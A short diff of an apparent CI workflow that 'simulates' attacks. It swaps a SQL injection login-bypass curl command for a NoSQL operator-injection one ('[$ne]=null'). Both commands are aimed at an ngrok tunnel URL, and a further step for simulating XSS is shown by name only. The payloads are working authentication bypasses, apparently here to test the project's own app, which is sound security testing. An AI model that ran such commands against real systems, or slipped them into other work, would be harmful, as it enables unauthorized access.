@@ -15,8 +15,8 @@ jobs:
 
       - name: Simulate SQL Injection Attack
         run: |
-          echo "Executing SQL Injection Attack..."
-          curl -X POST "https://9961-196-184-98-202.ngrok-free.app/login"   -d "username=admin' OR '1'='1' -- &password=dummy&returnurl=/"
+          echo "Executing NoSQL Injection Attack..."
+          curl -X POST https://9961-196-184-98-202.ngrok-free.app/login   -d 'username[$ne]=null&password[$ne]=null'
 
       - name: Simulate XSS Attack
         run: |
